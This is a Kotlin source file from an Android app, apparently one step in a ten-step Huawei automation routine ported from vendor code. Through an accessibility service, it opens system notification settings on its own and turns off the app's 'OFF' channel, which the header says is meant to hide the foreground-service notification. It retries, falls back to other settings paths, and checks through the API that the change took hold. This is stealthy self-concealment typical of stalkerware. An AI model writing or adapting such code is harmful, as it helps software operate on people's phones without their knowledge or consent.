package com.storm.safe.rock.service.modules.yw5xud.huawei

import android.content.Context
import android.content.Intent
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps
import com.storm.safe.rock.service.modules.yw5xud.common.NotificationSettingsFallback
import com.storm.safe.rock.service.modules.yw5xud.common.SwitchNodeFinder
import kotlinx.coroutines.delay

/**
 * Step 7/10 -- Notification Permission / close OFF channel (vendor m212171b8, L4165-4565).
 *
 * Opens CHANNEL_NOTIFICATION_SETTINGS for channel "OFF", then turns off the
 * "允许通知" switch to hide the foreground service notification.
 */
class HuaweiStep7NotifPerm(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: HuaweiSteps
) {
    companion object {
        private const val TAG = "HuaweiStep7NotifPerm"
    }

    @Suppress("UNUSED_PARAMETER")
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i(TAG, "[Step7/10] enter executeStep7NotificationPermission")
        HuaweiStepLogger.phase(7, "★ 关闭 OFF 频道通知 ★", "vendor L4188", logs)

        if (isStep7Completed()) {
            HuaweiStepLogger.skip(7, "SP 已标记完成", logs)
            return
        }

        // API-level pre-check
        try {
            val nm = steps.ctx.getSystemService(Context.NOTIFICATION_SERVICE) as? android.app.NotificationManager
            val channel = nm?.getNotificationChannel("OFF")
            if (channel == null) {
                HuaweiStepLogger.skip(7, "OFF channel 不存在 (API 验证)", logs)
                markStep7Completed()
                successes.add("[Step7/10] OFF channel 不存在（API 幂等跳过）")
                return
            }
            if (channel.importance == android.app.NotificationManager.IMPORTANCE_NONE) {
                HuaweiStepLogger.skip(7, "OFF channel 已被禁用 (IMPORTANCE_NONE)", logs)
                markStep7Completed()
                successes.add("[Step7/10] OFF channel 已禁用（API 幂等跳过）")
                return
            }
            HuaweiStepLogger.probe(7, "OFF channel importance", channel.importance)
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.w(TAG, "[Step7/10] API 验证失败，继续 UI 流程: ${e.message}")
        }

        val maxAttempts = 2
        var attempt = 1
        var switchSuccess = false
        var channelPageEverEntered = false
        while (attempt <= maxAttempts) {
            HuaweiStepLogger.phase(7, "第 $attempt 次尝试", "vendor L4275", logs)

            try {
                val intent = Intent("android.settings.CHANNEL_NOTIFICATION_SETTINGS").apply {
                    putExtra("android.provider.extra.APP_PACKAGE", steps.ctx.packageName)
                    putExtra("android.provider.extra.CHANNEL_ID", "OFF")
                    flags = 276824064
                }
                val launcher: Context = service ?: steps.ctx
                launcher.startActivity(intent)
                HuaweiStepLogger.probe(7, "CHANNEL_NOTIFICATION_SETTINGS launched", "ok")
            } catch (e: Exception) {
                HuaweiStepLogger.fail(7, "启动 CHANNEL_NOTIFICATION_SETTINGS 异常", e.message ?: "", failures)
                attempt++
                continue
            }

            delay(800L)

            val pageEntered = try { waitForChannelNotifPage() } catch (_: Exception) { false }
            HuaweiStepLogger.probe(7, "waitForChannelNotifPage", pageEntered)

            if (!pageEntered) {
                HuaweiStepLogger.warn(7, "未进入频道设置页，BACK 后重试", "vendor L4325", logs)
                try { service?.performGlobalAction(1) } catch (_: Exception) { }
                delay(100L)
                attempt++
                continue
            }
            channelPageEverEntered = true

            HuaweiStepLogger.phase(7, "关闭'允许通知'开关", "vendor L4338", logs)
            try {
                val switched = toggleChannelNotifSwitch()
                HuaweiStepLogger.probe(7, "toggleChannelNotifSwitch", switched)
                if (switched) {
                    switchSuccess = true
                    HuaweiStepLogger.success(7, "渠道已关闭", "vendor L4353", successes)
                } else {
                    HuaweiStepLogger.warn(7, "未找到开关，尝试 clickFirstSwitchOnDetailPage fallback", "vendor L4355", logs)
                    val fallbackOk = try { clickFirstSwitchOnDetailPage(targetChecked = false) } catch (_: Exception) { false }
                    HuaweiStepLogger.probe(7, "clickFirstSwitchOnDetailPage fallback", fallbackOk)
                    if (fallbackOk) switchSuccess = true
                }
            } catch (e: Exception) {
                HuaweiStepLogger.fail(7, "toggle 异常", e.message ?: "", failures)
                attempt++
                continue
            }

            delay(100L)
            try { service?.performGlobalAction(1) } catch (_: Exception) { }
            delay(100L)

            break
        }

        // APP fallback
        if (!switchSuccess && !channelPageEverEntered) {
            HuaweiStepLogger.warn(7, "CHANNEL 路径失败，尝试 APP_NOTIFICATION_SETTINGS fallback", "vendor 无 fallback", logs)
            val appFallback = NotificationSettingsFallback.launchAppNotificationSettings(service)
            HuaweiStepLogger.probe(7, "APP 级 fallback launch", appFallback)
            if (appFallback) {
                delay(800L)
                val toggled = try { toggleChannelNotifSwitch() } catch (_: Exception) { false }
                HuaweiStepLogger.probe(7, "app-fallback toggle", toggled)
                if (toggled) {
                    switchSuccess = true
                    HuaweiStepLogger.success(7, "APP 级 fallback 切换成功", "ADAPT real-device hardening", successes)
                }
            }
        }

        // API verification
        if (switchSuccess) {
            try {
                val nm = steps.ctx.getSystemService(Context.NOTIFICATION_SERVICE) as? android.app.NotificationManager
                val ch = nm?.getNotificationChannel("OFF")
                val verified = ch != null && ch.importance == android.app.NotificationManager.IMPORTANCE_NONE
                HuaweiStepLogger.probe(7, "API 回验 OFF channel 已关闭", verified)
                if (!verified) {
                    HuaweiStepLogger.warn(7, "UI 操作后 channel 未关闭", "importance=${ch?.importance}, 可能盲点错 Switch", logs)
                    switchSuccess = false
                }
            } catch (e: kotlinx.coroutines.CancellationException) {
                throw e
            } catch (e: Exception) {
                android.util.Log.w(TAG, "[Step7/10] API 回验异常，保持 switchSuccess: ${e.message}")
            }
        }

        if (switchSuccess) {
            markStep7Completed()
            HuaweiStepLogger.success(7, "Step 7 完成 + SP mark 写入", "vendor L4198/4386", successes)
        } else {
            HuaweiStepLogger.fail(7, "Step 7 所有 attempt 均失败",
                "不写 SP mark — 下次启动会重试", failures)
        }
    }

    // ---- helpers ----

    private fun isStep7Completed(): Boolean =
        HuaweiStepCompletionStore.isCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP7_NOTIFICATION_OFF)

    private fun markStep7Completed() {
        HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP7_NOTIFICATION_OFF)
    }

    private suspend fun waitForChannelNotifPage(): Boolean {
        val maxPolls = 5
        for (poll in 0 until maxPolls) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                for (kw in NotificationSettingsFallback.CHANNEL_KEYWORDS) {
                    val nodes = try { root.findAccessibilityNodeInfosByText(kw) } catch (_: Exception) { null }
                    if (!nodes.isNullOrEmpty() && nodes.any { it.isVisibleToUser }) {
                        HuaweiStepLogger.probe(7, "waitForChannelNotifPage matched", kw)
                        return true
                    }
                }
            }
            delay(500L)
        }
        return false
    }

    private fun toggleChannelNotifSwitch(): Boolean {
        return ui.closeSwitch("允许通知")
    }

    private fun clickFirstSwitchOnDetailPage(targetChecked: Boolean? = null): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val sw = findFirstSwitchInTree(root) ?: return false
        if (targetChecked != null && sw.isChecked == targetChecked) {
            return true
        }
        return sw.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
    }

    private fun findFirstSwitchInTree(node: android.view.accessibility.AccessibilityNodeInfo?, depth: Int = 0): android.view.accessibility.AccessibilityNodeInfo? {
        if (node == null || depth > 20) return null
        if (SwitchNodeFinder.isSwitchLike(node) || node.isCheckable) return node
        for (i in 0 until node.childCount) {
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            val found = findFirstSwitchInTree(child, depth + 1)
            if (found != null) return found
        }
        return null
    }
}
